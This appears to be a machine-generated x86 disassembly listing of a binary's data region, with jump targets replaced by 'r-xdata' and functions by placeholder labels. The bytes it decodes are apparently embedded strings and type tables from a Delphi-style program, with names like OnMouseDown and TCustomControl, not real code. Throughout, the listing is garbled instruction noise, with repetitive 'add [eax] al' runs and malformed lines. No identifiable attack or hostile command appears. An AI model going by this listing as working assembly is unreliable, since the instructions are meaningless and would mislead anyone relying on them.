inc esp
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
outsb
inc ebp
outsb
inc esp
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
jo r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090039 ] al
add [ eax + 0x4f070037 ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
loopne r-xdata
jo r-xdata
jns r-xdata
je r-xdata
outsb
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
pushad
inc eax
ja r-xdata
dec edi
outsb
push ebx
je r-xdata
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x242e765
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
xor eax 0x6e4f0900
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or cl [ edi + 0x6e ]
add [ eax ] al
add [ eax + 0x61 ] dh
jb r-xdata
jb r-xdata
je r-xdata
push ebx
jb r-xdata
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
inc esp
outsd
ja r-xdata
and al 0x44
add [ eax ] bh
inc ecx
add ah al
mov al [ 0x25340041 ]
inc esp
add [ edx ] cl
inc ecx
add [ eax ] bl
xchg ebp eax
inc ecx
add [ edx * 4 - 0x6a9fffbf ] bh
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
call 0x68442ae5
mov eax [ ecx ]
and [ edi - 0x69e7ffbf ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp 0x57e96d
dec ecx
je r-xdata
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x43e8acc0 ] cl
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
sub [ ecx + 0xd80044 ] al
les ecx [ esi ]
je r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
inc ecx
add [ esp ] ah
inc esp
add [ eax ] bl
xchg esi eax
jb r-xdata
jb r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
int3
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43e950c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jmp r-xdata
add ah cl
xchg edx eax
inc esp
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x3f74ffc0 ] ch
lodsb [ esi ]
call 0x114be8f1
push esp
lea eax [ bx + si ]
cmp al 0xe8
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
je r-xdata
outsd
jb r-xdata
pop es
jb r-xdata
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
inc esp
add ah al
push cs
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ecx
add [ esp + 0x44 ] bh
add ah ch
and al 0x44
add [ eax + ebx * 4 - 0x664fffbf ] bh
inc ecx
add [ 0xffffffff9bb80044 ] cl
inc ecx
add [ esp + ebx * 4 + 0x29900041 ] cl
inc eax
add al al
pushfd
inc ecx
add al dh
pushfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] al
add al dh
popfd
inc ecx
add [ eax - 0x1fffbe61 ] cl
lahf
inc ecx
add [ eax + 0x41 ] dh
add [ esi ] dl
push esp
inc ebx
jne r-xdata
add [ eax - 0x6b ] ah
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
shr cl 0x1
inc ebx
add [ eax + eax ] dl
add [ eax ] al
jo r-xdata
outsb
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
add [ ecx + ebx * 4 + 0x236c0041 ] ah
inc esp
add [ eax + 0x4004423 ] cl
0x9ea00041 0x41
add [ esp + eax * 2 ] ah
and al 0x44
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
add [ eax ] al
add [ eax ] al
js r-xdata
je r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
je r-xdata
add [ ecx + esi + 0x40 ] al
add al ch
xchg esp eax
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax ] ah
xchg edi eax
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jmp r-xdata
inc ebx
add al cl
jmp r-xdata
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pushad
imul ebp [ esi + 0x67 ] 0xe9ec9073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
xor eax [ eax ]
loopne r-xdata
inc eax
add ah ch
outsd
call 0xffffffffec442970
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc eax
inc ecx
add [ ecx + esi - 0x39a3ffbc ] dl
inc esp
add ah bl
push cs
inc edx
inc esp
daa
je r-xdata
sub [ ecx ] dh
insb
add [ 0x65646e49 ] al
js r-xdata
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
add [ eax + 0x27 ] ah
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
or [ edx ] al
in al dx
je r-xdata
imul ebp [ esi + 0x67 ] 0x43e95073
add [ eax + 0x62 ] bl
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
inc esp
add [ esi + eax * 8 + 0x44 ] bl
inc ebx
je r-xdata
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ esi + 0x44 ] ch
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
insb
jae r-xdata
add [ ebp - 0x1597ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_43eabe
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x18 ] cl
inc esp
add al cl
hlt
sub_43eae2
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
adc al 0x9
inc ebp
add [ eax ] dl
or al 0x45
add [ edx + esi ] bh
inc esp
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add al ch
daa
inc esp
add [ esi + ecx ] ah
inc ebp
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
sbb [ esp + eax * 2 ] dh
add [ eax - 0x3bffbbd8 ] bl
sub [ eax + eax + 0x2c ] al
xor al 0x44
add [ edi + 0x33540044 ] bh
inc esp
add [ eax + 0x33 ] ah
inc esp
add ah ch
xor eax [ eax + eax + 0x70 ]
mov al [ ebp ]
or al 0x28
inc esp
add [ edx + esi + 0x44 ] dh
add [ ebx + ebp ] bh
inc esp
add [ eax - 0x6fffbfd7 ] dl
sub [ eax ] eax
inc eax
sub [ eax + eax - 0x70 ] eax
sub [ eax ] eax
and al 0x34
inc esp
add [ eax ] dh
xor eax [ eax + eax + 0xd ]
add [ ecx ] al
add [ eax + esi * 4 ] al
adc [ eax + 0x2bbd11 ] dh
sub al 0x0
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x442950ff ]
add [ eax - 0x3bffbbd7 ] dh
sub [ eax + eax + 0x28 ] eax
das
inc esp
add [ ecx + ebp + 0x44 ] dh
add [ ecx + ebp + 0x44 ] bh
add [ ecx + ebp + 0x298c0044 ] al
inc esp
add [ eax + esi + 0x32100044 ] dl
inc esp
add [ ecx + esi + 0x44 ] dh
add al dh
xor [ eax + eax - 0x44 ] eax
xor [ eax + eax + 0xc ] eax
push esp
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x4f736310
ja r-xdata
je r-xdata
inc esp
xor [ eax ] eax
or [ 0x45a00044 ] dh
jb r-xdata
ja r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add ah bl
jmp r-xdata
in eax dx
inc ebx
add [ eax ] ah
out dx al
jb r-xdata
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc eax
add [ eax ] al
push ss
in al dx
add [ esi ] dl
ja r-xdata
inc ebx
jo r-xdata
add [ edx + eax - 0x15e40000 ] dl
imul edi [ eax + 0x65 ] 0x73631364
dec edi
ja r-xdata
inc ebx
je r-xdata
outsd
ja r-xdata
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
mov al [ ecx ]
xchg esp eax
xor [ eax + eax + 0x5c ] eax
jb r-xdata
inc edx
add [ esp + esi + 0x40b40044 ] al
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc edx
add [ ebx + ecx + 0xee40042 ] bh
insb
jae r-xdata
inc ebx
add ah al
push cs
add [ eax ] al
sbb al 0xea
or [ ebx + 0x73 ] ah
push ebx
imul ebp [ ebp + 0x70 ] 0x630e656c
jae r-xdata
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
jb r-xdata
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
rol al 0xec
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jb r-xdata
inc ebp
add al cl
or eax 0x8a840045
inc ecx
add [ ecx + esi - 0x39a3ffbc ] dl
inc esp
inc ebp
ja r-xdata
jb r-xdata
je r-xdata
inc edx
add ah ch
xor eax [ eax ]
jo r-xdata
popad
add [ edx + edi * 8 + 0x44 ] bh
inc esp
add [ esi + eax * 8 + 0x44 ] bl
popad
bound ebp [ ebp + 0x8 ]
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add dh ch
inc ebx
add [ edx ] cl
arpl [ ebx + 0x44 ] si
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add ah ch
in eax dx
inc ebx
add [ esi + ebp * 8 ] dh
inc ebx
add [ eax ] al
add [ eax ] al
outsd
mov [ eax + eax + 0x7c ] 0xfa
inc esp
sub_43ed16
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x24 ] cl
inc eax
inc esp
add al cl
hlt
sub_43ed3a
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
mov esp 0x10004435
or al 0x45
add [ eax ] ah
inc esp
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add al ch
daa
inc esp
add [ eax + 0x37 ] ah
inc esp
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
sbb [ esp + eax * 2 ] dh
add [ eax - 0x3bffbbd8 ] bl
sub [ eax + eax + 0x2c ] al
xor al 0x44
add [ edi + 0x33540044 ] bh
inc esp
add [ eax + 0x33 ] ah
inc esp
add ah ch
xor eax [ eax + eax + 0x70 ]
mov al [ ebp ]
or al 0x28
inc esp
add [ edx + esi + 0x44 ] dh
add [ ebx + ebp ] bh
inc esp
add [ eax + 0x40 ] bh
inc esp
add [ eax + 0x40004435 ] bl
sub [ eax + eax + 0x6c ] eax
inc eax
inc esp
add [ esp + esi ] ah
inc esp
add [ eax ] dh
xor eax [ eax + eax - 0x48 ]
xor [ eax + eax - 0x78 ] al
inc esp
add [ eax + 0x35 ] bl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2700040 ] dl
add [ eax ] al
or [ eax ] al
adc al 0x0
or [ eax - 0x43d343d5 ] esi
add [ edx ] eax
sldt [ ebx - 0x4f004600 ]
aaa
inc esp
add al ch
sub [ eax + eax - 0x58 ] eax
inc esp
add [ eax - 0x53ffbbc1 ] al
aas
inc esp
add [ eax - 0x47ffbbc0 ] al
inc edx
inc esp
add al bh
add [ esi ] dl
je r-xdata
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
or [ 0x45a00044 ] dh
inc ebp
add al cl
or eax 0x8a840045
inc ecx
add [ ecx + esi - 0x39a3ffbc ] dl
inc esp
inc eax
add [ eax ] al
push ss
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
out dx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
out dx eax
inc ebx
add [ eax + 0x74000002 ] bl
in al dx
inc ebx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
out dx al
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ esp + esi + 0x40b40044 ] al
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
add [ edx + ecx * 4 + 0x31940041 ] al
inc esp
add [ esi + eax * 8 + 0x44 ] bl
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
cmp [ eax + eax + 0xf ] al
push esp
inc ebx
jne r-xdata
inc esp
add [ eax - 0x7fffbbc2 ] ch
aas
inc esp
add [ edi + edi + 0x40800044 ] ch
inc esp
add [ eax - 0x7ffbbbe ] bh
in al dx
inc ebx
add al bl
jmp r-xdata
xor eax [ eax ]
add [ eax ] bl
or [ edx ] al
in al dx
sub_43eefe
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x24 ] cl
inc eax
inc esp
add al cl
hlt
sub_43f1ad
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
cmp al 0x10
inc eax
add [ eax ] dl
add al [ eax ]
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or eax 0x706f7244
inc esp
outsd
ja r-xdata
jb r-xdata
add bh bh
mov [ ecx ] al
inc ebx
outsd
jne r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
inc esp
hlt
add [ eax ] al
and al 0x0
push cs
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40103c74
add ah cl
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add ah bh
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0021 ] al
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
outsb
je r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ esi ] ah
add [ ebx ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax - 0x2d ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
imul ebp [ esi + 0x74 ] r-xdata
jne r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] al
outsb
je r-xdata
inc esp
xor eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
cmp al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
adc [ eax ] al
0xff0000 0x44d3
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
push eax
popad
jb r-xdata
je r-xdata
sub eax [ eax ]
push es
push ebx
outsd
jb r-xdata
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
les edi [ fs : esi + 0x44 ]
add [ esp + edi ] ah
jb r-xdata
jle r-xdata
inc ebp
add [ esp + edi + 0x10045 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ eax ] al
add al [ eax ]
inc [ ebp + esi + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x6948776f
outsb
je r-xdata
push eax
popad
jb r-xdata
adc [ eax ] al
test eax 0xf8ff0001
cmp eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
je r-xdata
jb r-xdata
inc ebx
push 0x65676e61
je r-xdata
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] cl
add [ ecx + edx * 8 - 0x2e43ffbc ] cl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
add [ es : ebx ] cl
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
add [ eax ] al
js r-xdata
add [ eax ] al
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
add [ eax + 0x4f090032 ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
cmp al ch
inc ebx
add [ eax - 0x7f00fffe ] al
add al [ eax ]
push eax
outsd
jo r-xdata
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
jb r-xdata
push ebp
jo r-xdata
dec ebx
jns r-xdata
je r-xdata
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
xchg [ eax + eax + 0x30 ] eax
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f09003d ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0038 ] al
outsb
inc [ ecx ]
call 0x2c3f669
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
je r-xdata
add bh bh
add [ edx ] 0x0
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
je r-xdata
jo r-xdata
outsb
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
insd
je r-xdata
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
jns r-xdata
jb r-xdata
outsb
dec edi
insd
je r-xdata
add [ eax ] al
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
outsd
ja r-xdata
inc esp
jb r-xdata
add [ eax ] al
xor [ esi ] 0x0
or cl [ edi + 0x6e ]
add [ eax + 0x4f0a0036 ] al
outsb
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
call 0x2cbf7a9
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ 0x654d6e4f ] cl
popad
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
add [ eax + 0x4f0a003e ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] cl
dec edi
jb r-xdata
inc [ ecx ]
push edi
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or [ edi + 0x6e ] ecx
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
jns r-xdata
je r-xdata
outsb
inc ebp
js r-xdata
enter 0x1 0xff
enter 0x1 0xff
